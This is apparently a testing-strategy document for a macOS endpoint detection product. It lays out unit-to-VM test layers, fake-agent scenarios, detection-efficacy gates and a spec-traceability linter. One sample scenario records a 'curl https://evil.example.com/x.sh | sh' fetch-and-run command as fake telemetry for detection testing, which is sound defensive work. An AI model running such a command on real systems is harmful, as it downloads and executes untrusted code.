# Testing strategy

How this repo proves the product works end to end: the layers, what runs where, the reusable artefacts that make each
layer cheap, and the rules a new contributor follows when adding code.

## Goals

- Fast feedback for the developer: unit tests run in seconds, the per-PR integration layers run in single-digit minutes.
- Honest coverage of the wire contract between agent, server, and UI: a regression at the integration boundary fails CI
  on the PR that introduced it, not at release time.
- Coverage of the macOS extension code in a way that does not require a live ESF kernel hook on every PR.
- Detection content is treated like any other code: every shipped rule has a scenario that proves it fires.
- One CI gate per layer so a reviewer can see at a glance which layer caught a regression.

Specs in `openspec/specs/**/spec.md` are the behavioural contract; the test layers below collectively prove the
contract is met.

## The test pyramid

The pyramid concept is the standard one (Cohn, _Succeeding with Agile_, 2009; refined as Google's
Small / Medium / Large test sizes). The compact `L0` to `L6` labels below are a repo-internal shorthand so we can talk
about "all lower layers must be green first" without listing them; the descriptive name is the canonical name and is
preferred in prose, PR descriptions, and commit messages.

```text
                       ____ Detection efficacy   (L6, nightly + RC)
                      /____ System / VM E2E      (L5, RC + scheduled)
                     /_____ Browser E2E + fake agent  (L4, per PR)
                    /______ Headless agent + server   (L3, per PR)
                   /_______ Cross-context integration (L2, per PR)
                  /________ Per-context integration   (L1, per PR)
                 /_________ Unit                      (L0, per PR)
```

| Layer | What it proves | Speed (target) | Trigger |
|---|---|---|---|
| Unit (L0) | Single-package correctness, error paths, table cases, property-based invariants | < 30 s per package | every PR |
| Per-context integration (L1) | Each bounded context's services work against real MySQL | < 90 s | every PR |
| Cross-context integration (L2) | Endpoint -> rules -> detection -> response with the HTTP boundary | < 2 min | every PR |
| Headless agent + server (L3) | Real agent Go code (queue + uploader + commander) talks to a real server | < 3 min | every PR |
| Browser E2E + fake agent (L4) | UI renders the data path that ingestion + detection produced | < 8 min | every PR |
| System / VM E2E (L5) | Real Swift extensions + real agent + real server on macOS | ~ 30 min | RC + scheduled |
| Detection efficacy (L6) | MITRE-aligned attack corpus -> assert rule fires within SLA | ~ 15 min | nightly + RC |

A run at any layer implies all lower layers have already passed; CI gates enforce that.

## Layer details

### Unit (L0)

- Per-package Go tests, co-located with the code.
- Vitest + V8 coverage for `ui/`.
- XCTest for Swift code in `extension/edr/` that does not require ESF or Network Extension framework objects. Driven
  by a SwiftPM package at `extension/edr/Package.swift` (sibling to `edr.xcodeproj`) that references the existing
  Swift sources via explicit `sources:` paths, with tests under `extension/edr/Tests/EDRExtensionLogicTests/`. CI runs
  `swift test --enable-code-coverage` on `macos-latest` via `.github/workflows/swift-test.yml`, gated by the same
  `extension/**` path filter as `swift-lint.yml`. UAT plan milestone **M7** delivered the package + initial test
  suites for `DNSParser`, `EventSerializer`'s payload + envelope structs, `BlockNotification`, `ApplicationControlStore`,
  and `FileHashCache`; `SigningInfoFallback` is deferred until a reliably-signed test fixture binary is in tree
  (it walks SecStaticCode against a real Mach-O on disk). The Xcode project remains the production build path for the
  signed system extension, network extension, and host app bundles -- main.swift, XPCServer, ESFClient and friends
  are deliberately NOT in the package's `sources:` list and only build inside their respective Xcode targets.
- Style guide: see `## Testing` in `CLAUDE.md` and `docs/go-conventions.md`. Table-driven by default, property-based
  via `pgregory.net/rapid` for invariants, `go test -fuzz` for untrusted input parsers.

### Per-context integration (L1)

- Per-context tests live in `server/<context>/internal/tests/`, `package tests`.
- They use real MySQL via `testdb/full.Open(t)`, which spins an isolated per-test database with all five context
  schemas pre-applied.
- Every new public service method on a bounded context must add at least one case here.

### Cross-context integration (L2)

- `test/integration/`, `package integration`.
- Composes all five bounded contexts the way `cmd/fleet-edr-server/main.go` does, exposed over a `httptest` server.
- Used for journeys that cross context boundaries (enroll -> ingest -> detect -> respond -> command ack).

### Headless agent + server (L3)

- The Go core of the agent (queue, uploader, enrolment) runs in CI against the real server, on Linux, with the macOS
  extension dependency stubbed out behind build tags.
- The macOS-only packages (`agent/receiver`, `agent/xpcbridge`) are split with build tags: `//go:build darwin && cgo`
  for the CGo XPC implementation, `//go:build !darwin || !cgo` for the stub receiver. The stub exposes an `Inject`
  entry point so the headless binary and tests can deliver events as if they had arrived from the XPC peer. The
  production agent's call sites use `*receiver.Receiver` directly; the build tags select the right struct per
  platform without an interface. UAT plan milestone **M1** delivered this split; the linux compile invariant is
  enforced by `task build:agent:linux` in CI (`agent-test` job).
- The headless binary `agent/cmd/fleet-edr-agent-headless` wires the same `queue + uploader + enrollment` pipeline as
  production but with the stub receiver, and exposes a small local control plane on a unix socket:
  - `POST /event`: inject one JSON event into the stub receiver's events channel.
  - `GET /state`: return `{events_injected, inject_errors, last_inject_at_unix, queue_depth}`.
  Built by `task build:agent:headless` (also gated in CI). UAT plan milestone **M2** delivered this binary; **M3**
  shipped the `test/fakeagent` library that loads YAML scenarios and feeds the control plane.
- The L3 end-to-end test at `test/integration/agentserver/` is UAT plan milestone **M4**. It boots the real server
  via `test/integration.Setup` (full Stack + real MySQL + processor goroutines), runs the M2 headless agent's
  `Run` in-process, drives each scenario from the M3 fakeagent starter corpus via `FeedControlPlane`, and asserts
  on the detection service's `ListHosts` event counts. Gated by the existing `server-test` CI job via the
  recursive `./test/integration/...` glob; local devs run with `task test:integration:agent-server`. Scenarios
  use canonical UUID host ids so they pass the enrollment endpoint's `hardware_uuid` regex.

### Browser E2E with the fake agent (L4)

- Playwright tests live in `test/e2e/`. Real server + real MySQL + real UI; tests start the server via the
  `webServer` block in `playwright.config.ts`.
- For tests that need realistic agent data (process trees, alerts, app-control flow, host list), the spec drives the
  M5 fixture at `test/e2e/fixtures/agent.ts`: it reads the same YAML scenarios as the Go fakeagent library
  (`test/fakeagent/scenarios/`), enrolls a per-test host via `/api/enroll`, generates wire envelopes matching
  `schema/events.json`, then POSTs them to `/api/events` with the minted bearer token. The wire smoke spec at
  `test/e2e/tests/qa/agent-events-flow.spec.ts` (M5) proves the path end-to-end across the starter corpus; the
  UI smoke spec at `test/e2e/tests/qa/host-list-and-process-tree.spec.ts` (M6) signs in via break-glass and
  asserts on host list + process tree page rendering. M6 also adds `enrollHostsBatch(count)` to the agent fixture
  (for the 25-host visible-row case) plus `resetHostData(db)` in `fixtures/auth.ts` that wipes agent-side tables
  without touching the sessions / WebAuthn rows that hold the spec's auth state. The fixture bypasses the headless
  agent binary intentionally - the queue + uploader path is already L3-covered (M4); L4 is about UI behavior under
  realistic data.
- M6 covers the host-list + process-tree categories from the L4 wishlist. Alert detail per shipped rule, app-control
  rule push (UI + agent ack), and the realistic-alert reauth flow are deferred until M10 ships rule-firing scenarios
  the alerts can be derived from.
- For pure auth/RBAC/session tests, direct SQL fixtures under `test/e2e/fixtures/db.ts` remain the right tool; they
  are faster and the data they seed is not exercised through the ingestion path.
- CI runs Playwright in phases (`scripts/test-e2e-coverage.sh`) so env-isolation tests (rate limits, short session
  timeouts, IP allowlist) get their own server lifetime.

### System / VM end-to-end (L5)

- Real macOS VM with SIP and Gatekeeper enabled, fresh snapshot per run.
- The VM mirrors the pilot-customer environment: stock macOS, no Xcode, no Homebrew, no developer tools beyond what a
  signed PKG install actually delivers. Snapshots revert to a known-good "clean-pre-install" state for each run so
  signing, notarization, and extension activation are exercised every time.
- Driven by `scripts/uat/system-test.sh`: SSHs into the VM, optionally installs the candidate PKG and waits up to 60s
  for system-extension activation, polls the server's `/api/hosts` for the new host to enrol within 30s, runs the
  scenario's `attack.sh`, then polls `/api/alerts` for each rule_id listed in the scenario's `expected.yaml`
  within the per-rule SLA. UAT plan milestone **M9** delivered the driver plus one starter scenario,
  `attack-runbook`, which asserts six rule_ids fire from the dogfood runbook. The scenario is a thin wrapper
  around `scripts/qa/attack-runbook.sh`; the dogfood script stays the interactive demo, M9 adds the asserted
  automation layer on top. App Control active blocking has its own scenario, `app-control-block`, which posts a
  BINARY BLOCK rule via the per-policy `/api/v1/app-control/*` surface, confirms the extension denies the matching
  exec on the VM, and asserts the resulting `application_control_block` alert. Driver supports `--dry-run` for
  orchestration smoke-tests without driving real infrastructure. See `scripts/uat/README.md` for the schema - capture procedure.
- Runs on a real Mac with a SIP-enabled guest (GitHub-hosted macOS runners do not allow nested virtualisation
  or expose the ESF entitlement). Never per PR. UAT plan milestone **M11** ships the local-execution flavour:
  `task uat:l5 -- attack-runbook ...` (or `scripts/uat/system-test.sh attack-runbook ...` direct) runs the
  driver against the developer's own VM. The asserted-scenario shape gives a clean pass/fail signal suitable
  for a release-candidate checklist. Wiring the same driver into a `.github/workflows/system-test.yml` that
  fires on a `0 5 * * *` cron + every `v*` tag, against a self-hosted GitHub Actions runner labelled
  `macos-self-hosted-edr-qa`, is preserved in the `m11-runner-future-work` branch and tracked as issue
  [#220](https://github.com/getvictor/fleet-edr/issues/220) -- it requires registering a Mac as a runner,
  provisioning the `edr-qa-l5` environment + secrets, and building a session-refresh routine, none of which
  are blocking the local flow today.
- Setting up a local VM for this layer: see `docs/install-agent-manual.md` and `docs/install-server.md`. The exact
  VM tool (UTM, VMware Fusion, Parallels) is the contributor's choice; the only requirements are SIP-enabled,
  Gatekeeper-enabled, snapshot-capable, and reachable over SSH from the runner host.

### Detection efficacy (L6)

- `test/efficacy/corpus/T<MITRE-id>-<slug>/` per attack technique. Each folder ships:
  - `scenario.yaml`: a fake-agent scenario (consumed by `test/efficacy/efficacy_test.go` and reusable by the
    headless and browser E2E layers).
  - `attack.sh`: a shell driver that runs the technique on a live VM (consumed by `scripts/uat/system-test.sh`
    locally per M11; or by the future self-hosted runner when that work picks up). The starter scenarios ship
    placeholder `attack.sh` files documenting the real-VM equivalent.
  - `expected.yaml`: the detection assertions (which rule fires, within what SLA, severity). Shared between
    modes.
- `test/efficacy/noise/*.yaml` plus one shared `expected.yaml` (with `rules: []`) form the ambient-noise lane
  -- every benign scenario must produce zero alerts.
- UAT plan milestone **M10** delivered the harness `test/efficacy/efficacy_test.go` plus 8 attack scenarios
  (one per shipped catalog rule with a MITRE mapping: `T1059`, `T1059.002`, `T1059.004` / `T1566.001`,
  `T1543.001`, `T1543.004`, `T1548.003`, `T1555.001`, `T1574.006`) and 2 starter noise scenarios. The runner
  composes `test/integration.Setup` (real MySQL + processor goroutines) and uses `PostDirect` from the M3
  fakeagent library to POST events to `/api/events` directly, bypassing the M2 agent (the agent path is
  already L3-covered by M4; L6's signal is specifically about rule firings on the canonical event sequences).
- Aggregate gates from the runner: detection rate >= 95% across attacks, false-positive rate <= 1% across
  noise. Per-scenario failures show up as the scenario's own `t.Run` line; the aggregate gate fires at the
  end of the parent test so a single regression and a "the whole layer broke" pattern are visually distinct
  in the test report.
- Runs on the new `Detection efficacy` workflow: nightly cron + on demand via `workflow_dispatch`, plus path
  filters for `server/rules/internal/catalog/**`, `server/detection/**`, `test/efficacy/**`, `test/fakeagent/**`,
  `test/integration/setup.go` and the workflow file itself so a catalog edit triggers it immediately. NOT
  wired per PR -- L0..L4 catch per-PR drift; L6 catches catalog-wide regression.

### Soak, scale, chaos (out of scope for per-PR CI)

A first scale baseline ships with the rest of the plan: 100 simulated agents against a single server + MySQL stack
for 30 minutes, recorded baseline checked into the repo. Longer soak runs, 500-agent scale, MySQL/server/cert/OIDC
chaos, and the operational tooling for all of them (`tools/chaosctl/`) are tracked separately. The fake-agent library
and headless binary are the shared substrate.

UAT plan milestone **M12** ships the first cut of the scale lane:
`test/scale/` exposes a `scale.Run(ctx, Options)` runner plus a `scaledriver` binary invoked via `task uat:scale`.
Each simulated host enrols via `/api/enroll`, then loops `fakeagent.PostDirect` against `/api/events` for the configured
duration; the runner records client-observed p50/p95/p99 latency and asserts the documented gate
(`p99 < 250ms`, zero errors). A per-PR smoke (5 hosts x 5s) at `test/scale/scale_test.go` runs on every push via the
`./test/scale/...` glob in the server-test job (`task test:go:server:coverage`) and proves the harness itself does not
rot. The 30-minute baseline is captured manually and committed to `test/scale/baselines/baseline.json`. Queue-depth
probes and SigNoz cross-checks (see the M12 row in `ai/uat/plan.md`) are explicitly deferred to a follow-up.

## Reusable artefacts

### Fake agent and headless agent binary

The same library serves multiple consumers, so the wire contract is exercised end to end at every layer that uses it:

- `test/fakeagent/`: Go library (UAT plan **M3**). Loads YAML scenarios, emits wire-format envelopes with deterministic
  timestamps, and feeds them either through the headless binary's `POST /event` control plane (`FeedControlPlane`) or
  directly to a server's ingest endpoint with a bearer token (`PostDirect`). Functional options cover start time, host
  id override, playback speed multiplier, and `PostDirect` batch size.
- `agent/cmd/fleet-edr-agent-headless`: production agent built with the stub receiver, plus an opt-in unix-socket control
  plane for tests. Doubles as the load generator.
- `test/fakeagent/scenarios/`: starter YAML scenarios shipped with M3 (`quiet-host`, `exec-fork-exit`,
  `dns-and-network`). The M10 efficacy corpus and the L3 integration job add their own scenarios under separate paths.

A scenario file looks like:

```yaml
name: "Suspicious curl | sh"
mitre: T1059.004
host:
  id: aa-bb-cc-dd-ee-ff
  hostname: lab-mac.local
  os: macOS 14.4
timeline:
  - {at: 0ms,   type: fork, child_pid: 4001, parent_pid: 1}
  - {at: 5ms,   type: exec, pid: 4001, ppid: 1, path: /bin/zsh,
       args: ["zsh", "-c", "curl https://evil.example.com/x.sh | sh"],
       cwd: /tmp, uid: 501, gid: 20}
  - {at: 10ms,  type: fork, child_pid: 4002, parent_pid: 4001}
  - {at: 12ms,  type: exec, pid: 4002, ppid: 4001, path: /usr/bin/curl,
       args: ["curl", "https://evil.example.com/x.sh"],
       cwd: /tmp, uid: 501, gid: 20}
  - {at: 50ms,  type: network_connect, pid: 4002, protocol: tcp, direction: outbound,
       remote_address: 203.0.113.7, remote_port: 443}
  - {at: 200ms, type: exit, pid: 4002, exit_code: 0}
assertions:
  - within: 5s
    rule: suspicious-curl-pipe-sh
    severity: high
```

The library exposes deterministic-timestamp and host-multiplexing options so the same scenario can run as a
single-host repro in CI or as a 100-host fleet for the scale baseline.

### Captured ESF event corpus

`EventSerializer` in the system extension consumes opaque `es_message_t` instances; we cannot construct those in user
space. Instead, captured serializer outputs are committed under `extension/edr/Tests/corpus/<macOS-version>/<scenario>/`
as JSON (compression-ready but currently plain so PR diffs stay reviewable). `CorpusReplayTests` walks every file,
decodes via the matching typed `EventEnvelope<P>`, re-encodes via the production `.sortedKeys` `JSONEncoder`, and
asserts the bytes are byte-stable; a rename in `CodingKeys`, a change to encoder settings, or a flip in an optional
field's encode-when policy will land as a red gate instead of a silent change shipped to agents. UAT plan
milestone **M8** delivered the harness plus a starter seed under `macOS-26/baseline/` covering live exec, signed
exec, snapshot exec, fork, exit, open, and `application_control_block`; a follow-up replaces the hand-seeded
sentinels with real captures from the SIP-enabled `edr-qa` VM. When the wire format intentionally changes the
goldens are regenerated with `EDR_CORPUS_REGENERATE=1 swift test --package-path extension/edr --filter
CorpusReplayTests` and the diff is reviewed in the PR; see `extension/edr/Tests/corpus/README.md` for the
regeneration + capture procedures.

## Spec-to-test traceability

Spec scenarios in `openspec/specs/**/spec.md` are linked to tests by canonical ID.

### ID scheme

Mechanical, derived from heading text:

```text
openspec/specs/server-event-ingestion/spec.md
  ### Requirement: Authenticated batch event submission
  #### Scenario: A valid agent posts a batch
```

becomes

```text
server-event-ingestion/authenticated-batch-event-submission/a-valid-agent-posts-a-batch
```

The slug rule is: lowercase, replace runs of non-alphanumeric characters with `-`, strip leading and trailing
dashes. `tools/spectrace --list-ids` prints the canonical ID for every scenario so contributors do not type IDs by
hand.

### Marker conventions

Tests reference the canonical ID. Any of the following forms work; the linter accepts all of them:

**Go subtest name:**

```go
t.Run("spec:server-event-ingestion/authenticated-batch-event-submission/a-valid-agent-posts-a-batch", func(t *testing.T) {
    // ...
})
```

**Go table-driven, via a `Spec` field that the test code threads into the subtest name.** The scanner anchors on the
literal `spec:` string, not on Go AST. A `Spec: "<id>"` field that is consumed only by `assert.Equal(...)` is NOT a
marker; the field has to flow through `t.Run("spec:"+tc.Spec, ...)` (or similar) so the literal `spec:<id>` string lands
in the source:

```go
cases := []struct {
    Spec string
    Name string
    // ...
}{
    {Spec: "server-event-ingestion/required-field-validation/a-batch-contains-an-event-with-a-missing-field",
     Name: "missing event_id"},
}
```

**Go comment marker (when keeping the subtest name short matters):**

```go
// spec:server-event-ingestion/required-field-validation/a-batch-contains-an-event-with-a-missing-field
t.Run("missing event_id", func(t *testing.T) { /* ... */ })
```

**Playwright title prefix:**

```ts
test("spec:ui-authentication-session/break-glass-redemption/operator-redeems-bootstrap-token renders dashboard", ...);
```

**Swift XCTest (identifiers cannot carry slashes, so dashes become underscores):**

```swift
func test_spec_extension_xpc_server_peer_validation_signing_required() throws { /* ... */ }
```

### The linter

`tools/spectrace check` walks `openspec/specs/**/spec.md`, computes canonical IDs for every `#### Scenario:` under a
`### Requirement:` whose body contains SHALL or MUST, then walks the codebase for matching markers. By default the
check exits 0 unless a reference points to a non-existent canonical ID (which catches drift after a spec rename); with
`--strict` it also fails when a SHALL / MUST scenario has zero references. The CI workflow at
`.github/workflows/spectrace.yml` runs `check --strict` on every PR.

Scenarios declared in in-flight change proposals (`openspec/changes/<change>/specs/<capability>/spec.md`, the
`--changes-dir` tree, default `openspec/changes`) are also valid marker targets. This lets a PR add a `spec:<id>`
marker for a scenario it is introducing before the change is archived into `openspec/specs/`, without `check` flagging
the marker as a dangling reference. WIP scenarios only widen what a marker may point at; they impose no coverage
obligation (they are not in the `--strict` denominator) until the change is archived and its delta merges into the live
specs. A MODIFIED requirement that repeats a live scenario heading is expected and collapses harmlessly.

`tools/spectrace list-ids [--normative-only]` prints every canonical scenario ID so contributors can copy a marker
without typing the slug.

`tools/spectrace report --format=md [--output FILE]` (M13 v2, issue #233) renders the Markdown coverage matrix: one
row per scenario, one column per layer (L0..L6), each cell linking to every marker that covers the scenario at that
layer. An `Other` column appears when at least one row has a non-test enforcement marker (workflow YAML, packaging
shell). `report` never gates; it is for humans and PR comments.

`check --by-layer` annotates the gap report with the layer coverage profile per scenario; `check --new-code` scopes
the gate to scenarios added or modified in the current PR (diff against the merge base, default `origin/main`),
matching SonarCloud's "new code" framing.

Rollout sequence (delivered):

- M13 v1: advisory `check`, then `check --strict` once the marker backlog closed on main.
- M13 v2: `report --format=md`, `check --by-layer`, `check --new-code`. `--new-code` is the recommended fallback if
  a future spec restructure briefly inflates the uncovered set: it preserves the gate signal on the delta without
  blocking the broader work.

## Minimum requirements per PR

These are the rules a contributor follows when adding code. They are enforced partly by CI and partly by code review:

1. **New wire-format struct or event field**: add a property-based round-trip test
   (`Marshal . Unmarshal == identity`). Already enforced by the existing PBT habit; see the decision matrix in
   `CLAUDE.md`.
2. **New detection rule under `server/rules/internal/catalog/`**: ship a scenario at
   `test/efficacy/corpus/T<MITRE-id>/` with both `scenario.yaml` (consumed by the headless and browser E2E layers) and
   `expected.yaml` (assertions). Add `attack.sh` when the rule needs system / VM coverage to be honest.
3. **Agent or extension change touching ESF, XPC, or the event wire format**: must be exercised on a live macOS VM
   (the system / VM layer) before the release-candidate tag. Flag the change in the PR description so a reviewer can
   confirm the VM run happened.
4. **New or modified SHALL / MUST scenario in `openspec/specs/`**: at least one test must reference the canonical
   scenario ID. `tools/spectrace --list-ids` prints the IDs; pick one of the marker forms above.
5. **Symbol deletion**: scrub every doc comment, IPC dispatcher reference, and adjacent doc that still names the
   deleted symbol. Stale comments in IPC-adjacent code are a recurring class of footgun (see `CLAUDE.md`).

## CI tiering

| Trigger | Layers run | Wall-time budget |
|---|---|---|
| Every PR | Unit through browser E2E (L0 to L4) + `spectrace` advisory | < 20 min total (parallelised) |
| Nightly on `main` | + detection efficacy (L6) + small soak | < 90 min |
| Release-candidate tag | + system / VM (L5) + detection efficacy full corpus + 100-agent scale | < 4 hours |
| Manual pre-pilot | System / VM (L5) with the pilot's specific environment knobs | as needed |

The `changes` gate-then-analyze pattern in `.github/workflows/test.yml` is preserved; jobs only fire when their
relevant inputs change.

## Coverage gates

| Layer | Tooling | Gate |
|---|---|---|
| Unit (Go) | `go test -coverpkg=./server/...,./agent/...,./internal/...` | Sonar 80% on new code |
| Unit (TS) | `vitest --coverage` (V8) | Sonar 80% on new code |
| Unit (Swift) | `swift test --enable-code-coverage` via `extension/edr/Package.swift` | Sonar 80% on new code (same unified gate as Go and TS) |
| Integration layers (per-context, cross-context, headless) | wide `-coverpkg`, merged via `go tool covdata textfmt` | feeds the same Sonar Go gate |
| Browser E2E | monocart V8 coverage, merged into `lcov-e2e.info` | feeds the Sonar TS gate |
| System / VM | per-scenario pass/fail; no line coverage | green/red checklist in the workflow run |
| Detection efficacy | per-technique detection rate >= 95%, FP rate <= 1% on ambient noise | hard gate |
| Spec traceability | `tools/spectrace check` | phased: advisory -> new-code -> full |

## References

- `docs/best-practices.md`: industry checklist; the testing section maps onto the layers above.
- `docs/adr/0004-modular-monolith-bounded-contexts.md`: the bounded contexts the per-context and cross-context layers
  are organised around.
- `docs/go-conventions.md`: style and idiom rules.
- `openspec/specs/`: the behavioural contract that `spectrace` enforces against.
- ISO 29148, DO-178C, IEC 62304: requirements traceability matrix in safety-critical domains; the lighter-weight
  marker-and-linter pattern used here adapts the same idea.
- Kubernetes conformance suite: `[Conformance]` tagging of e2e tests is the same shape as our scenario IDs.
